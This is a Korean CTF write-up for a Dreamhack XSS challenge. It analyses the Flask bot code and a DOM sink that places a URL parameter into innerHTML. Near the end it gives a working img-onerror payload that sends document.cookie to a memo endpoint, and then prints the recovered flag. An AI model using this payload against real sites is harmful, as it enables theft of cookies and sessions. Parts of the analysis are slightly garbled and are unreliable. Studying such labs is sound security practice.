# XSS-2
## 날짜
2026-09-17

## 문제 URL
https://dreamhack.io/wargame/challenges/268

### 코드 분석
```python
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")
```
```/vuln``` 엔드포인트는 ```render_template``` 함수 사용
```render_template```함수는 전달된 템플릿 변수가 기록될 때 HTML 엔티티코드로 변환해 저장되기 때문에 XSS 발생 안함 
-> 이용자가 param으로 입력한 값을 페이지에 그대로 출력하지 않는다


```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>' 

        return '<script>alert("good");history.go(-1);</script>'
```
```check_xss``` 함수는 이용자가 flag에 POST로 전송한 param 값이 XSS 공격에 사용될 수 있는 값인지 아닌지를 확인. 이때 이용자가 flag 페이지에 입력한 param을 포함해 vuln 페이지에 접근하는 URL 생성

-> ```read_url```함수로 vuln 페이지에 접근하는 URL과 사용자의 쿠키가 전달됨

## 취약점 분석
xss-2는 xss-1과 달리 ```/vuln```에서 입력받은 param값을 그대로 출력하지 않는다. 대신  ```read_url()```은 별도의 입력값 변환 과정이 없기 때문에 XSS이 발생한다.

https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations
```InnerHTML`` 참고자료

innerHTML은 웹 페이지 구조를 다루는 기술인 DOM(Document Object Model)의 속성
가져오기 (읽기): 지정한 태그 내부의 모든 HTML과 텍스트를 문자열로 가져옴
```Javascript
var content = document.getElementByID('example').innerHTML;
```
설정하기 (쓰기): 문자열로 된 HTML 코드를 실제 DOM 요소로 바꿔서 화면에 보여줌
```Javascript
document.getElementByID('example').innerHTML='New Content';
```

### vuln.html
```html
<script>var x=new URLSearchParams(location.search); document.getElementByID('vuln').innerHTML=x.get('param');</script>
```
현재 페이지의 URL 쿼리 문자열에서 param 파라미터 값을 추출하고 해당 값을 ```vuln```이라는 ID를 가진 요소의 내부 HTML로 설정함
->파라미터의 값을 통해 쓰기 수행
-> innerHTML을 통해 유저가 URL의 param 쿼터 파라미터를 조작하면 웹페이지 내용 변경 가능한 취약점 존재

```/flag``` 엔드포인트에 아래 익스플로잇 코드 입력
```html
<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">
```

memo에 플래그 출력됨
```
flag=DH{3c01577e9542ec24d68ba0ffb846508f}
```